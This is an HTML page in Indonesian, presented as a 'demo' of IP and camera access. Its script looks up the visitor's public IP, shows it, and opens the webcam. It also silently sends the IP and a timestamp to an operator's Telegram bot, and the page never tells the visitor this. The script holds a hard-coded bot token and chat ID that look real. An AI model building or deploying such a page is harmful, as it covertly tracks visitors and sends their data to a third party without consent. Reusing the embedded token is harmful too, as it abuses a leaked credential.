<!DOCTYPE html>
<html>
<head>
  <title>Project Demo Web + Telegram</title>
</head>
<body>
  <h1>Demo: IP & Kamera (dengan izin)</h1>
  <p id="ip-info">Mendeteksi IP...</p>
  <video id="video" width="400" autoplay></video>

  <script>
    // ======== Bagian 1: Ambil IP Publik ========
    let userIP = '';
    fetch('https://api.ipify.org?format=json')
      .then(res => res.json())
      .then(data => {
        userIP = data.ip;
        document.getElementById('ip-info').textContent = `IP Kamu: ${userIP}`;
        sendToTelegram(userIP); // Kirim ke Telegram
      })
      .catch(err => {
        document.getElementById('ip-info').textContent = 'Gagal mendapatkan IP';
      });

    // ======== Bagian 2: Akses Kamera (dengan izin) ========
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(function(stream) {
        document.getElementById('video').srcObject = stream;
      })
      .catch(function(error) {
        console.error('Akses kamera ditolak atau gagal:', error);
      });

    // ======== Bagian 3: Kirim ke Bot Telegram ========
    function sendToTelegram(ip) {
      const token = '8427844482:AAHHXCP_psaehlBnm8SHBEEFvhTehYw2gEY';         // Ganti dengan token bot kamu
      const chat_id = '7600526426';         // Ganti dengan chat ID kamu
      const time = new Date().toLocaleString();
      const message = `üì° Pengunjung Baru:\n\nüåê IP: ${ip}\nüïí Waktu: ${time}`;

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: chat_id,
          text: message
        })
      });
    }
  </script>
</body>
</html>
